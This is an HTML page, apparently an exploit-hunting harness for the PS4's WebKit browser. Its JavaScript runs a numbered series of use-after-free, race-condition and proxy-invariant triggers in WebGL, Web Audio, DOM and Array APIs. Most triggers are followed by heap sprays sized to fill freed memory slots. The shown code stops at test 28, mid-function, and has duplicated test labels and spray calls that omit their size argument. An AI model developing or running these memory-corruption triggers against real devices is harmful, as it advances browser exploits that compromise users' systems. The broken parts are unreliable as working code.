<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Hunter V43 (Raw Core)</title>
</head>
<body>

<h1>PS4 HUNTER V43 (RAW CORE)</h1>
<p>3x Memory Crash | 3x Logic/Race</p>

<hr>
<h3>CRASH VECTORS (Memory Corruption)</h3>
<button onclick="runtest1()">TEST 1: ScriptProcessorNode Auditiva UAF</button>
<button onclick="runtest2()">TEST 2: WebGL Program Use-After-Free</button>
<button onclick="runtest3()">TEST 3: DOM Node Removal during InsertBefore</button>
<button onclick="runtest4()">TEST 4: Array.sort() Length Confusion (Silent)</button>
<button onclick="runtest5()">TEST 5: MessagePort Transfer Closure Race (Race)</button>
<button onclick="runtest6()">TEST 6: RegExp Sticky State Desync (State)</button>
<button onclick="runtest7()">TEST 7: TreeWalker Filter Detach (UAF)</button>
<button onclick="runtest8()">TEST 8: WebGL Deleted Buffer Attribute (Stale Pointer)</button>
<button onclick="runtest9()">TEST 9: CustomElement Document.write Recursion</button>
<button onclick="runtest10()">TEST 10: Array.reverse() Getter Side-Effect (Silent)</button>
<button onclick="runtest11()">TEST 11: Promise.race() Thenable State Confusion (Race)</button>
<button onclick="runtest12()">TEST 12: Proxy 'getPrototypeOf' Invariant Sabotage (State)</button>
<button onclick="runTest13()">TEST 13: Canvas Pattern Source Resize UAF</button>
<button onclick="runTest14()">TEST 14: Range.insertNode DOM Mutation UAF</button>
<button onclick="runTest15()">TEST 15: WebGL Texture PBO Delete Race</button>
<button onclick="runTest16()">TEST 16: Array.shift() Sparse Hole Leak (Silent)</button>
<button onclick="runTest17()">TEST 17: MessageChannel Port Close/Transfer Race (Race)</button>
<button onclick="runTest18()">TEST 18: Proxy 'isExtensible' Invariant Sabotage (State)</button>
<button onclick="runTest19()">TEST 19: TextNode Normalize/Range UAF</button>
<button onclick="runTest20()">TEST 20: WebGL Delete Texture while Attached to FBO</button>
<button onclick="runTest21()">TEST 21: ShadowDOM Slot Assignment Recursion</button>
<button onclick="runTest22()">TEST 22: Array.from Iterator Resize (Silent)</button>
<button onclick="runTest23()">TEST 23: FileReader Blob Revocation (Race)</button>
<button onclick="runTest24()">TEST 24: Object.seal Prototype Swap (State)</button>
<button onclick="runTest25()">TEST 25: ResizeObserver Layout Thrash UAF</button>
<button onclick="runTest26()">TEST 26: WebGL Texture Delete During Draw</button>
<button onclick="runTest27()">TEST 27: AudioBufferSource Start/Stop Race</button>
<button onclick="runTest28()">TEST 28: Array.concat Proxy Resize (Silent)</button>
<button onclick="runTest29()">TEST 29: Worker Transfer/Close Race (Race)</button>
<button onclick="runTest30()">TEST 30: Proxy PreventExtensions Invariant (State)</button>
<button onclick="runTest31()">TEST 31: CSS Keyframes Rule Mutation UAF</button>
<button onclick="runTest32()">TEST 32: WebGL Shader Detach/Link Race</button>
<button onclick="runTest33()">TEST 33: TextTrackCueList Index Access UAF</button>
<button onclick="runTest34()">TEST 34: TypedArray.from Buffer Detach (Silent)</button>
<button onclick="runTest35()">TEST 35: MessagePort Self-Transfer Check (State)</button>
<button onclick="runTest36()">TEST 36: RegExp Exec Re-entry Recursion (Race)</button>
<button onclick="runTest37()">TEST 37: AudioBuffer Detach during Playback (UAF)</button>
<button onclick="runTest38()">TEST 38: Range.surroundContents Mutation (Crash)</button>
<button onclick="runTest39()">TEST 39: WebGL2 TransformFeedback Active Delete</button>
<button onclick="runTest40()">TEST 40: Float64/BigInt64 Bitwise Aliasing (Silent)</button>
<button onclick="runTest41()">TEST 41: Proxy DefineProperty Invariant (State)</button>
<button onclick="runTest42()">TEST 42: BroadcastChannel Message Race (Race)</button>
<button onclick="runTest43()">TEST 43: ReadableStream Tee Cancel UAF</button>
<button onclick="runTest44()">TEST 44: WebGL VertexAttribPointer Buffer Swap</button>
<button onclick="runTest45()">TEST 45: HTMLOptionsCollection Length Setter GC Crash</button>
<button onclick="runTest46()">TEST 46: Array.splice Proxy Resize (Silent)</button>
<button onclick="runTest47()">TEST 47: CacheStorage Match/Delete Race (Race)</button>
<button onclick="runTest48()">TEST 48: Proxy getOwnPropertyDescriptor Invariant (State)</button>
<button onclick="runTest49()">TEST 49: AudioParam Automation Removal UAF</button>
<button onclick="runTest50()">TEST 50: execCommand Mutation UAF</button>
<button onclick="runTest51()">TEST 51: WebGL Instanced Attrib Buffer Swap</button>
<button onclick="runTest52()">TEST 52: Array.lastIndexOf Proxy Resize (Silent)</button>
<button onclick="runTest53()">TEST 53: Fetch Stream Abort Race (Race)</button>
<button onclick="runTest54()">TEST 54: Proxy setPrototypeOf Invariant (State)</button>
<button onclick="runTest55()">TEST 55: Selection.deleteFromDocument Mutation UAF</button>
<button onclick="runTest56()">TEST 56: ReadableStream PipeTo Cancel Logic Error</button>
<button onclick="runTest57()">TEST 57: WebGL VertexArrayObject Delete Race</button>
<button onclick="runTest58()">TEST 58: Array.fill Proxy Resize Trap (Silent)</button>
<button onclick="runTest59()">TEST 59: MessagePort Double Transfer (Race/Crash)</button>
<button onclick="runTest60()">TEST 60: Object.isFrozen Proxy Invariant (State)</button>
<button onclick="runTest61()">TEST 61: SVG Animation Element Target UAF</button>
<button onclick="runTest62()">TEST 62: WebAudio AudioParam Timeline UAF</button>
<button onclick="runTest63()">TEST 63: WebGL2 UniformBufferObject (UBO) Delete Race</button>
<button onclick="runTest64()">TEST 64: RegExp Subclass Exec Result Poisoning (Silent)</button>
<button onclick="runTest65()">TEST 65: WeakSet Add/GC Proxy Revoke (State)</button>
<button onclick="runTest66()">TEST 66: MessageChannel Entangled Transfer Race (Race)</button>
<button onclick="runTest67()">TEST 67: History State GC Race (Crash)</button>
<button onclick="runTest68()">TEST 68: Worker Terminate Transfer Race (Crash)</button>
<button onclick="runTest69()">TEST 69: IntersectionObserver Cross-Doc Adopt (Crash)</button>
<button onclick="runTest70()">TEST 70: DataView Detached Buffer Access (Silent)</button>
<button onclick="runTest71()">TEST 71: History PushState Port Clone (Race)</button>
<button onclick="runTest72()">TEST 72: MutationObserver Recursive Remove (State)</button>
<button onclick="runTest73()">TEST 73: FileReader Sync/Async Race (Crash)</button>
<button onclick="runTest74()">TEST 74: XHR Abort Event Re-entry (Crash)</button>
<button onclick="runTest75()">TEST 75: NodeIterator DOM Removal (UAF)</button>
<button onclick="runTest76()">TEST 76: Array.sort w/ Resize (Silent Leak)</button>
<button onclick="runTest77()">TEST 77: MessageChannel GC Collection Race (Race)</button>
<button onclick="runTest78()">TEST 78: Iframe History State Detach (State)</button>
<button onclick="runTest79()">TEST 79: SVG Use Element Shadow UAF (Target: 176b)</button>
<button onclick="runTest80()">TEST 80: TextTrackCue Validate Race (Target: 104b)</button>
<button onclick="runTest81()">TEST 81: HTMLTextArea API Value Sanitizer (Target: 208b)</button>
<button onclick="runTest82()">TEST 82: RegExp Input Getter Mutation (Silent)</button>
<button onclick="runTest83()">TEST 83: Blob URI Revoke vs Worker Fetch (Race)</button>
<button onclick="runTest84()">TEST 84: Iframe Sandbox Flag Persistence (State)</button>
<button onclick="runTest85()">TEST 85: History PopState Iframe Nuke (Target: 255b)</button>
<button onclick="runTest86()">TEST 86: Worker Port Post-Termination UAF (Target: 32b)</button>
<button onclick="runTest87()">TEST 87: Video TextTrackCue Active Remove (Target: 16b)</button>
<button onclick="runTest88()">TEST 88: DataView Detach Read (Silent)</button>
<button onclick="runTest89()">TEST 89: Cache API Put/Delete Race (Race)</button>
<button onclick="runTest90()">TEST 90: MutationObserver Tree Cycle (State)</button>
<button onclick="runTest91()">TEST 91: Details Toggle Event UAF (Target: 40b)</button>
<button onclick="runTest92()">TEST 92: DOMTokenList Iteration Nuke (Crash)</button>
<button onclick="runTest93()">TEST 93: Text.splitText Mutation Race (UAF)</button>
<button onclick="runTest94()">TEST 94: Array.includes Proxy Trap (Silent)</button>
<button onclick="runTest95()">TEST 95: BroadcastChannel Close/Post (Race)</button>
<button onclick="runTest96()">TEST 96: Proxy defineProperty Seal Bypass (State)</button>
<button onclick="runTest95()">TEST 95: HTMLFormControlsCollection Sort UAF (Target: 208b)</button>
<button onclick="runTest96()">TEST 96: TableSection DeleteRow Layout UAF (Target: 176b)</button>
<button onclick="runTest97()">TEST 97: AudioWorklet Node Destructor Race (Target: 104b)</button>
<button onclick="runTest98()">TEST 98: Array.reduceRight Proxy Trap (Silent)</button>
<button onclick="runTest99()">TEST 99: MessagePort Transfer Queue Race (Race)</button>
<button onclick="runTest100()">TEST 100: Geometry DOMMatrix Infinite Cycle (State)</button>
<hr>
<div id="log" style="border:1px solid #000; padding:10px; font-family:monospace;">Waiting...</div>

<script>
    var logDiv = document.getElementById('log');

    function log(msg, type) {
        // Unifiquei os tipos para garantir que 'ok' também fique verde se usado
        var isSuccess = (type === 'success' || type === 'ok');
        var color = type === 'alert' ? 'red' : (isSuccess ? 'green' : 'black');
        var prefix = type === 'alert' ? '?? [ALERTA]: ' : (isSuccess ? '? [OK]: ' : '>> ');
        logDiv.innerHTML += '<div style="color:' + color + ';">' + prefix + msg + '</div>';
    }

    function sprayHeap() {
        try {
            var s = [];
            for (var i = 0; i < 2000; i++) {
                s.push(new Uint8Array(1024).fill(0x41));
            }
        } catch (e) {}
    }
 // HEAP SPRAY CIRÚRGICO (Baseado em PS4_EXTERMINATOR_CLEAN.json)
    // Alvos: FPuVH (104, 176), A8tBH (208)
    // Usamos ArrayBuffers para tentar ocupar slots do tamanho exato no Heap do WebKit
    var sprayStore = [];
    function spray(targetSize) {
        try {
            // Ajuste fino para overhead do alocador (geralmente 16-32 bytes)
            var len = targetSize - 16; 
            if (len < 0) len = targetSize;
            
            for (var i = 0; i < 4000; i++) {
                var ab = new ArrayBuffer(len);
                var view = new Uint8Array(ab);
                view.fill(0x41); // 'A'
                sprayStore.push(ab);
            }
        } catch (e) {}
    }

    // --- 1. CRASH: ScriptProcessorNode UAF ---
    function runtest1() {
        log("Iniciando Crash 1: Audio UAF...");
        try {
            var ctx = new (window.AudioContext || window.webkitAudioContext)();
            var sp = ctx.createScriptProcessor(4096, 1, 1);
            
            sp.onaudioprocess = function(e) {
                sp.disconnect();
                sp.onaudioprocess = null;
                sp = null;
                ctx.close(); 
                ctx = null;
                sprayHeap(); 
                
                var buf = e.inputBuffer.getChannelData(0);
                buf[0] = 0xFF; 
            };
            
            sp.connect(ctx.destination);
            log("Audio process iniciado.");
        } catch(e) { log("Erro: " + e.message); }
    }

    // --- 2. CRASH: WebGL Program Use-After-Free ---
    function runtest2() {
        log("Iniciando Crash 2: WebGL UAF...");
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl');
        if(!gl) return log("WebGL off");

        var p = gl.createProgram();
        var v = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(v, "void main(){gl_Position=vec4(0,0,0,1);}");
        gl.compileShader(v);
        gl.attachShader(p, v);
        gl.linkProgram(p);
        gl.useProgram(p);

        gl.deleteProgram(p);
        gl.deleteShader(v);
        sprayHeap();

        try {
            gl.drawArrays(gl.POINTS, 0, 1);
            log("WebGL sobreviveu (Safe).", "success");
        } catch(e) { log("Erro: " + e); }
    }

    // --- 3. CRASH: DOM Node Removal during InsertBefore ---
    function runtest3() {
        log("Iniciando Crash 3: DOM Insert UAF...");
        var parent = document.createElement('div');
        var ref = document.createElement('div');
        var node = document.createElement('div');
        parent.appendChild(ref);
        
        node.addEventListener('DOMNodeInserted', function() {
            log("Evento disparado. Removendo referência...");
            parent.removeChild(ref);
            ref = null;
            sprayHeap();
        });

        try {
            parent.insertBefore(node, ref);
            log("DOM Insert finalizado.");
        } catch(e) { log("Erro: " + e); }
    }

    // --- 4. SILENT: Array.sort() Length Confusion ---
    // CORREÇÃO: Adicionado () após runtest4
    function runtest4() {
        log("Iniciando Silent 4: Array Sort...");
        var arr = [1, 2, 3, 4, 5];
        var leaked = false;
        
        arr.sort(function(a, b) {
            if (arr.length === 5) {
                arr.length = 1;
                sprayHeap();
            }
            if (a === undefined || b === undefined) return 0;
            
            if (typeof a === 'number' && a > 10) leaked = true;
            return a - b;
        });

        if (leaked || (arr.length === 1 && arr[0] !== 1)) {
            log("ALERTA: Dados corrompidos detectados no Sort!", "alert");
        } else {
            log("Sort comportou-se corretamente.", "success");
        }
    }

    // --- 5. RACE: MessagePort Transfer Closure ---
    function runtest5() {
        log("Iniciando Race 5: Port Transfer...");
        var mc = new MessageChannel();
        var p1 = mc.port1;
        
        var trap = {
            get p() {
                p1.close();
                return p1;
            }
        };

        try {
            window.postMessage(trap, '*', [p1]);
            log("Race disparada (Verifique logs de crash se houver).", "success");
        } catch(e) {
            log("Erro Race: " + e);
        }
    }

    // --- 6. STATE: RegExp Sticky State Desync ---
    function runtest6() {
        log("Iniciando State 6: RegExp Sticky...");
        var re = /A/y;
        var str = "A";
        
        re.lastIndex = {
            valueOf: function() {
                str = "B"; 
                sprayHeap(); 
                return 0;
            }
        };

        try {
            var res = re.exec(str); 
            
            if (res && res[0] === 'A' && str === 'B') {
                log("ALERTA: Estado dessincronizado! Match em string antiga.", "alert");
            } else {
                log("RegExp seguro.", "success");
            }
        } catch(e) { log("Erro: " + e); }
    }

    // --- 7. CRASH: TreeWalker Filter Detach ---
    function runtest7() {
        log("Iniciando Crash 7: TreeWalker...");
        var root = document.createElement('div');
        var c1 = document.createElement('div');
        var c2 = document.createElement('div');
        root.appendChild(c1);
        root.appendChild(c2);
        
        var tw = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
            acceptNode: function(node) {
                if (node === c1) {
                    log("Filtro ativo em c1. Removendo nó...");
                    root.removeChild(c1); 
                    c1 = null;
                    sprayHeap(); // CORREÇÃO: spray() -> sprayHeap()
                    return NodeFilter.FILTER_ACCEPT;
                }
                return NodeFilter.FILTER_ACCEPT;
            }
        });

        try {
            tw.nextNode(); 
            tw.nextNode(); 
            var res = tw.nextNode(); 
            log("TreeWalker sobreviveu. Próximo: " + (res ? res.tagName : "null"), "ok");
        } catch(e) { log("Erro capturado: " + e.message); }
    }

    // --- 8. CRASH: WebGL Deleted Buffer Attribute ---
    function runtest8() {
        log("Iniciando Crash 8: WebGL Buffer...");
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl');
        if(!gl) return log("WebGL off");

        var b = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, b);
        gl.bufferData(gl.ARRAY_BUFFER, new Uint8Array(100), gl.STATIC_DRAW);
        
        gl.enableVertexAttribArray(0);
        gl.vertexAttribPointer(0, 1, gl.BYTE, false, 0, 0);

        log("Deletando buffer vinculado...");
        gl.deleteBuffer(b);
        sprayHeap(); // CORREÇÃO: spray() -> sprayHeap()

        try {
            gl.drawArrays(gl.POINTS, 0, 10);
            log("WebGL Draw Call seguro.", "ok");
        } catch(e) { log("Erro WebGL: " + e); }
    }

    // --- 9. CRASH: CustomElement Document.write Recursion ---
    function runtest9() {
        log("Iniciando Crash 9: CE Recursion...");
        
        class Bomb extends HTMLElement {
            constructor() {
                super();
                log("Construtor rodando. Chamando document.write...");
                try {
                    document.write("<b>BOOM</b>");
                } catch(e) { log("Bloqueio detectado: " + e.message, "ok"); }
            }
        }
        
        if (!customElements.get('x-bomb')) {
            customElements.define('x-bomb', Bomb);
        }
        
        var div = document.createElement('div');
        div.innerHTML = "<x-bomb></x-bomb>";
    }

    // --- 10. SILENT: Array.reverse() Getter Side-Effect ---
    function runtest10() {
        log("Iniciando Silent 10: Array.reverse...");
        var arr = [1, , 3]; 
        var target = [1, 2]; 
        
        Object.defineProperty(Array.prototype, "1", {
            get: function() {
                log("Lendo buraco. Encolhendo array...");
                arr.length = 0; 
                sprayHeap(); // CORREÇÃO: spray() -> sprayHeap()
                return "trap";
            },
            configurable: true
        });

        try {
            var res = arr.reverse();
            delete Array.prototype["1"];

            if (res.length > 0 && res[0] === 3) {
                log("ALERTA: Array fantasma acessado após resize!", "alert");
            } else {
                log("Array.reverse seguro.", "ok");
            }
        } catch(e) { log(e); }
    }

    // --- 11. RACE: Promise.race() Thenable State Confusion ---
    function runtest11() {
        log("Iniciando Race 11: Promise State...");
        var resolved = false;
        
        var evil = {
            then: function(resolve, reject) {
                log("Thenable executando...");
                resolved = true;
            }
        };

        var p2 = new Promise(function(r){ 
            if(resolved) r("Win"); else r("Lose");
        });

        Promise.race([evil, p2]).then(function(v) {
            log("Vencedor: " + v);
            if(v === "Win") log("ALERTA: Efeito colateral vazou ordem de execução.", "alert");
            else log("Ordem de microtasks correta.", "ok");
        });
    }

    // --- 12. STATE: Proxy 'getPrototypeOf' Invariant Sabotage ---
    function runtest12() {
        log("Iniciando State 12: Proxy Invariant...");
        var target = {};
        Object.preventExtensions(target); 
        
        var p = new Proxy(target, {
            getPrototypeOf: function() {
                log("Interceptando getPrototypeOf...");
                return Array.prototype;
            }
        });

        try {
            var proto = Object.getPrototypeOf(p);
            log("ALERTA: Invariante de Proxy violada! Protótipo falso retornado.", "alert");
        } catch(e) {
            if (e instanceof TypeError) log("Motor aplicou regra de segurança corretamente.", "ok");
            else log("Erro desconhecido: " + e.message);
        }
    }
// --- TEST 13: Canvas Pattern Source Resize UAF ---
    // Cria um padrão usando um canvas como fonte.
    // Redimensiona o canvas fonte para 0 (liberando sua memória)
    // enquanto o motor tenta rasterizar o padrão.
    function runTest13() {
        log("Iniciando Test 13: Canvas Pattern UAF...");
        var c = document.createElement('canvas');
        var ctx = c.getContext('2d');
        var src = document.createElement('canvas');
        src.width = 100; src.height = 100;
        var sCtx = src.getContext('2d');
        sCtx.fillRect(0,0,100,100);

        // Armadilha no getter de 'width' do source
        // WebKit pode checar width ao criar o padrão ou ao desenhar
        var p = ctx.createPattern(src, 'repeat');
        
        // Redimensiona violentamente
        src.width = 0; 
        spray(); // Tenta ocupar a memória do backing store antigo
        
        try {
            ctx.fillStyle = p;
            ctx.fillRect(0, 0, 100, 100); // Trigger
            log("Canvas Pattern desenhado (Safe).", "ok");
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 14: Range.insertNode DOM Mutation UAF ---
    // Insere um nó via Range API.
    // Um observador de mutação remove o contêiner pai durante o processo de inserção.
    function runTest14() {
        log("Iniciando Test 14: Range Insert UAF...");
        var d = document.createElement('div');
        var s = document.createElement('span');
        d.appendChild(s);
        var r = document.createRange();
        r.setStart(d, 0);
        
        var t = document.createElement('b');
        
        // Mutation Event legado ou Observer síncrono
        d.addEventListener('DOMNodeInserted', function() {
            log("Evento disparado. Removendo pai...");
            d.remove();
            spray();
        });

        try {
            r.insertNode(t);
            log("Range insert finalizado.", "ok");
        } catch(e) { log("Erro DOM: " + e); }
    }

    // --- TEST 15: WebGL Texture PBO Delete Race ---
    // Pixel Buffer Object (PBO) é usado para upload assíncrono de textura.
    // Iniciamos o upload e deletamos o buffer imediatamente.
    function runTest15() {
        log("Iniciando Test 15: WebGL PBO Race...");
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl2');
        if(!gl) return log("WebGL2 ausente.");

        var pbo = gl.createBuffer();
        gl.bindBuffer(gl.PIXEL_UNPACK_BUFFER, pbo);
        gl.bufferData(gl.PIXEL_UNPACK_BUFFER, new Uint8Array(1024), gl.STREAM_DRAW);
        
        var tex = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, tex);

        // Inicia upload DMA
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA8, 16, 16, 0, gl.RGBA, gl.UNSIGNED_BYTE, 0);
        
        // Race: Deleta buffer fonte imediatamente
        gl.deleteBuffer(pbo);
        spray();
        
        // Força flush
        gl.finish();
        log("WebGL commands flushed.", "ok");
    }

    // --- TEST 16: Array.shift() Sparse Hole Leak ---
    // Array.shift() move elementos. Se o array for esparso (com buracos) e usarmos
    // um protótipo poluído para interceptar a movimentação, podemos ler memória não inicializada.
    function runTest16() {
        log("Iniciando Test 16: Shift Hole Leak...");
        var a = [1, , 3]; // Buraco no índice 1
        var val = "safe";
        
        Object.defineProperty(Array.prototype, "1", {
            get: function() {
                // O shift move o 3 para o índice 1.
                // Se ele ler o índice 1 (que é buraco) antes de escrever...
                return "polluted"; 
            },
            set: function(v) { val = v; }
        });

        try {
            a.shift(); 
            // Limpa
            delete Array.prototype["1"];
            
            if (val === "polluted") log("Prototype poluiu a lógica (Expected).", "ok");
            else if (val === undefined) log("ALERTA: Leitura de buraco retornou undefined puro.", "ok");
            else log("Shift moveu valor: " + val, "ok");
        } catch(e) { log(e); }
    }

    // --- TEST 17: MessageChannel Port Close/Transfer Race ---
    // Transfere uma porta enquanto a fecha num getter.
    // Testa a robustez do serializador de mensagens estruturadas.
    function runTest17() {
        log("Iniciando Test 17: Port Race...");
        var mc = new MessageChannel();
        var p1 = mc.port1;
        var p2 = mc.port2;

        var trap = {
            get port() {
                p1.close(); // Fecha antes de transferir
                return p1;
            }
        };

        try {
            // Tenta postar para si mesmo
            window.postMessage(trap, "*", [trap.port]); 
            log("PostMessage executado.", "ok");
        } catch(e) { 
            // DataCloneError é o esperado se for seguro
            log("Resultado: " + e.name); 
        }
    }

    // --- TEST 18: Proxy 'isExtensible' Invariant Sabotage ---
    // Um Proxy deve reportar a mesma extensibilidade que seu alvo.
    // Se mentirmos, o motor pode otimizar acessos de propriedade incorretamente.
    function runTest18() {
        log("Iniciando Test 18: Proxy Invariant...");
        var target = {};
        Object.preventExtensions(target); // Alvo não extensível
        
        var p = new Proxy(target, {
            isExtensible: function() {
                log("Interceptando isExtensible. Mentindo (true)...");
                return true; // Violação! Alvo é false.
            }
        });

        try {
            var res = Object.isExtensible(p);
            // Se chegou aqui, o motor engoliu a mentira ou lançou erro interno
            log("ALERTA: Motor aceitou violação de invariante? Res: " + res, "alert");
        } catch(e) {
            if(e instanceof TypeError) log("Motor detectou violação (Safe).", "ok");
            else log("Erro estranho: " + e);
        }
    }
// --- TEST 19: TextNode Normalize/Range UAF ---
    // Cria nós de texto adjacentes, seleciona um com Range, e chama normalize().
    // normalize() funde nós de texto, o que deleta os antigos.
    // O Range deve atualizar seus ponteiros. Se falhar, aponta para memória liberada.
    function runTest19() {
        log("Iniciando Test 19: Text Normalize...");
        var d = document.createElement('div');
        var t1 = document.createTextNode("A");
        var t2 = document.createTextNode("B");
        var t3 = document.createTextNode("C");
        d.appendChild(t1);
        d.appendChild(t2); // Adjacentes
        d.appendChild(t3);
        document.body.appendChild(d);

        var r = document.createRange();
        r.setStart(t2, 0); // Aponta para t2
        r.setEnd(t2, 1);

        // Armadilha: MutationObserver para detectar a fusão
        var obs = new MutationObserver(function() {
            log("Mutação detectada. Spraying...");
            spray();
        });
        obs.observe(d, {childList: true});

        try {
            d.normalize(); // Funde t1, t2, t3 em um novo nó. t2 é deletado.
            
            // Tenta acessar o range que apontava para t2
            var sc = r.startContainer;
            log("Range container type: " + sc.nodeType);
            
            if (sc === t2 && !d.contains(t2)) {
                log("ALERTA: Range aponta para nó deletado (Zombie)!", "alert");
            } else {
                log("Normalize tratado corretamente.", "ok");
            }
        } catch(e) { log("Erro: " + e); }
        setTimeout(function(){ d.remove(); }, 100);
    }

    // --- TEST 20: WebGL Delete Texture while Attached to FBO ---
    // Anexa textura a um Framebuffer, deleta a textura, e tenta desenhar.
    function runTest20() {
        log("Iniciando Test 20: WebGL FBO UAF...");
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl');
        if(!gl) return log("WebGL off");

        var tex = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, tex);
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);

        var fb = gl.createFramebuffer();
        gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);

        // Deleta textura anexada
        gl.deleteTexture(tex);
        spray();

        // Tenta limpar/desenhar no FBO que referencia a textura morta
        try {
            var status = gl.checkFramebufferStatus(gl.FRAMEBUFFER);
            if (status === gl.FRAMEBUFFER_COMPLETE) {
                gl.clear(gl.COLOR_BUFFER_BIT);
                log("Operação em FBO com textura deletada (Safe se driver tratou).", "ok");
            } else {
                log("FBO incompleto após delete (Correto).", "ok");
            }
        } catch(e) { log("Erro: " + e); }
    }

    // --- TEST 21: ShadowDOM Slot Assignment Recursion ---
    // Cria estrutura ShadowDOM onde slots tentam se atribuir ciclicamente
    // ou causar recursão infinita no cálculo de estilo.
    function runTest21() {
        log("Iniciando Test 21: Slot Recursion...");
        if (!document.body.attachShadow) return log("ShadowDOM off");

        var host = document.createElement('div');
        var root = host.attachShadow({mode: 'open'});
        
        var slot1 = document.createElement('slot');
        slot1.name = "a";
        var slot2 = document.createElement('slot');
        slot2.name = "b";
        
        root.appendChild(slot1);
        root.appendChild(slot2);
        
        var child = document.createElement('div');
        child.slot = "a";
        host.appendChild(child);
        document.body.appendChild(host);

        // Thrashing
        try {
            // Troca slots rapidamente forçando recálculo de distribuição
            for(var i=0; i<100; i++) {
                child.slot = (i % 2 === 0) ? "b" : "a";
                var h = host.offsetHeight; // Força layout
            }
            log("Slot assignment safe.", "ok");
        } catch(e) { log("Erro: " + e); }
        setTimeout(function(){ host.remove(); }, 100);
    }

    // --- TEST 22: Array.from Iterator Resize (Silent) ---
    // Array.from consome um iterador. Se o iterador alterar o array fonte
    // (no caso de conversão) ou estado global, o loop de cópia pode corromper.
    function runTest22() {
        log("Iniciando Test 22: Array.from Logic...");
        var src = [1, 2, 3];
        var iter = {
            [Symbol.iterator]: function() {
                var step = 0;
                return {
                    next: function() {
                        step++;
                        if (step === 2) {
                            log("Iterador passo 2. Zerando fonte...");
                            src.length = 0;
                            spray();
                        }
                        return { value: step, done: step > 3 };
                    }
                };
            }
        };

        try {
            var res = Array.from(iter);
            log("Resultado length: " + res.length);
            if (res.length === 3 && res[2] === 3) log("Array.from completou logicamente.", "ok");
            else log("ALERTA: Lógica interrompida ou dados parciais.", "alert");
        } catch(e) { log(e); }
    }

    // --- TEST 23: FileReader Blob Revocation (Race) ---
    // Inicia leitura de Blob e revoga a URL/Blob imediatamente.
    function runTest23() {
        log("Iniciando Test 23: FileReader Race...");
        var b = new Blob(["TESTDATA"]);
        var fr = new FileReader();
        
        fr.onload = function() {
            if (fr.result === "TESTDATA") log("Leitura bem sucedida antes do revoke.", "ok");
            else log("ALERTA: Leitura corrompida ou vazia.", "alert");
        };
        fr.onerror = function() { log("Erro de leitura (Esperado).", "ok"); };

        // Race
        fr.readAsText(b);
        // Tenta invalidar o blob subjacente (simulado via close se fosse File, ou revoke URL se via XHR)
        // Aqui apenas anulamos e forçamos pressão
        b = null;
        spray();
    }

    // --- TEST 24: Object.seal Prototype Swap (State) ---
    // Object.seal impede adição de propriedades.
    // Tenta trocar o protótipo (__proto__) de um objeto selado,
    // o que deve ser proibido. Se passar, quebra invariantes de segurança.
    function runTest24() {
        log("Iniciando Test 24: Seal Proto Swap...");
        var obj = { x: 1 };
        Object.seal(obj);
        
        try {
            // Tenta trocar protótipo
            Object.setPrototypeOf(obj, { y: 2 });
            
            // Se chegou aqui, falhou a segurança
            if (obj.y === 2) log("ALERTA: Protótipo de objeto selado foi trocado!", "alert");
            else log("Protótipo trocado mas propriedade inacessível (Estranho).", "ok");
        } catch(e) {
            log("Bloqueio de segurança ativo (Safe): " + e.message, "ok");
        }
    }
// --- TEST 25: ResizeObserver Layout Thrash UAF ---
    function runTest25() {
        log("Iniciando Test 25: ResizeObserver UAF...");
        var d = document.createElement('div');
        d.style.width = "100px"; d.style.height = "100px";
        document.body.appendChild(d);
        
        var ro = new ResizeObserver(function(entries) {
            log("Observer triggered. Removing node...");
            d.remove();
            d = null;
            spray();
            try {
                // Força reflow em nó desconectado
                var w = entries[0].target.offsetWidth;
                log("Layout query survived: " + w, "ok");
            } catch(e) { log("Error: " + e); }
        });
        
        ro.observe(d);
        d.style.width = "200px"; // Trigger
    }

    // --- TEST 26: WebGL Texture Delete During Draw ---
    function runTest26() {
        log("Iniciando Test 26: WebGL Texture Race...");
        var c = document.createElement('canvas');
        var gl = c.getContext('webgl');
        if(!gl) return log("WebGL off");

        var tex = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, tex);
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2, 2, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
        
        var fb = gl.createFramebuffer();
        gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
        gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, tex, 0);

        // Delete texture handle
        gl.deleteTexture(tex);
        spray();

        try {
            // Read from FBO with deleted attachment
            var p = new Uint8Array(4);
            gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, p);
            log("ReadPixels executed on dead texture.", "ok");
        } catch(e) { log("WebGL Error: " + e); }
    }

    // --- TEST 27: AudioBufferSource Start/Stop Race ---
    function runTest27() {
        log("Iniciando Test 27: Audio Race...");
        var ctx = new (window.AudioContext || window.webkitAudioContext)();
        var src = ctx.createBufferSource();
        src.buffer = ctx.createBuffer(1, 1024, 44100);
        src.connect(ctx.destination);
        
        // Race condition: start and stop in same tick sequence
        try {
            src.start(0);
            src.stop(0);
            src.disconnect();
            src = null;
            spray();
            ctx.close();
            log("Audio start/stop sequence complete.", "ok");
        } catch(e) { log("Audio Error: " + e); }
    }

    // --- TEST 28: Array.concat Proxy Resize (Silent) ---
    function runTest28() {
        log("Iniciando Test 28: Concat Proxy...");
        var target = [1, 2, 3];
        var p = new Proxy(target, {
            get: function(t, k) {
                if (k === 'length') {
                    return t.length;
                }
                if (k === '0') {
                    log("Reading index 0. Shrinking array...");
                    t.length = 0;
                    spray();
                }
                return t[k];
            }
        });

        try {
            var res = [].concat(p);
